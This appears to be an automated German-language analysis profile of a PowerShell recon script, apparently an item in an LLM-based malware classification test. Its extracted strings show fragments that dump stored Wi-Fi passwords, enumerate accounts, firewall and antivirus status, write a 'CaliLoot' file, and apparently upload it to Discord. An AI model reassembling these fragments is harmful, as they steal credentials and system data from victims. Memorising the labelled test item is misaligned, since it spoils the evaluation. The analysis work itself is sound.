# Steckbrief: tech_013_Get-Recon.ps1

- SHA256: `558c16e52b018c826a59e15bd2ae405212412a303557d5d632117951b29a5d9c`
- Groesse: 5002 Bytes, 124 Zeilen
- Ground-Truth-Label (aus Ordner): **techniques**
- Kein Urteil enthalten. Bewertung erfolgt durch das LLM.

## Stufe 1 - Reine Extraktion
- Strings gesamt: 24 (Auszug unten)
- Base64-Bloecke gesamt: 0, davon dekodierbar: 0
- Strings (Auszug):
  - `http://ip-api.com/json`
  - `$env:TEMP\CaliLoot.txt`
  - ` : `
  - `)[1]).Trim()
}
$WLANProfileObjects =@()

Foreach($WLANProfileName in $WLANProfileNames){

    try{
        $WLANProfileP`
  - ` key=clear | select-string -Pattern `
  - `) -split `
  - `)[1]).Trim()
    }Catch{
        $WLANProfilePassword = `
  - `
    }

    $WLANProfileObject = New-Object PSCustomobject 
    $WLANProfileObject | Add-Member -Type NoteProperty -Name`
  - ` -Value $WLANProfileName
    $WLANProfileObject | Add-Member -Type NoteProperty -Name `
  - ` -Value $WLANProfilePassword
    $WLANProfileObjects += $WLANProfileObject
    Remove-Variable WLANProfileObject    
}
r`
  - ` | Out-File -FilePath $outputFile -Append
            }

            `
  - ` | Out-File -FilePath $outputFile -Append
            Get-WmiObject Win32_UserAccount | ForEach-Object {
               `
  - ` | Out-File -FilePath $outputFile -Append
            }

            $firewallStatus = Get-NetFirewallProfile | Select-O`
  - ` | Out-File -FilePath $outputFile -Append

            $antivirus = Get-CimInstance -Namespace `
  - ` -ClassName `

## Stufe 2 - Statische Merkmale (zusaetzlich)
- Auffaellige Tokens (Name: Vorkommen):
  - webclient: 1
- URLs: `http://ip-api.com/json`
- Pfade: `$env:TEMP\CaliLoot.txt`, `$env:username`
- Cmdlets: Add-Member, Format-Table, Get-AppxPackage, Get-CimInstance, Get-ComputerInfo, Get-NetFirewallProfile, Get-Networks, Get-Process, Get-Recon, Get-WmiObject, Invoke-RestMethod, New-Object, Out-File, Out-Null, Remove-Variable, Select-Object, Select-String, Upload-Discord, Where-Object

## Stufe 3 - Struktur (zusaetzlich)
- Beobachtete Abfolge:
  1. WebClient erstellen
